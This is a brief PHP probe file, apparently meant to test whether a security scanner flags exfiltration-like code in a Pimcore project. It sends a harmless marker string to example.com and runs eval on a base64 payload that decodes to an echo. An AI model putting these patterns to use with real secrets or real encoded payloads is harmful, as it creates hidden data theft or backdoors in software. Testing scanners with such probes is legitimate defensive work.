<?php
// SECURITY-GATE PROBE — harmless marker, DO NOT MERGE.
// Mimics exfiltration patterns the scanner must catch. Reads NO real secrets.
$marker = 'PIMCORE_SECURITY_TEST_MARKER';
// network call to an unexpected host from test code:
@file_get_contents('https://example.com/collect?d=' . urlencode($marker));
// obfuscated payload that decodes to a harmless echo:
eval(base64_decode('ZWNobyAiUElNQ09SRV9TRUNVUklUWV9URVNUX01BUktFUiI7'));
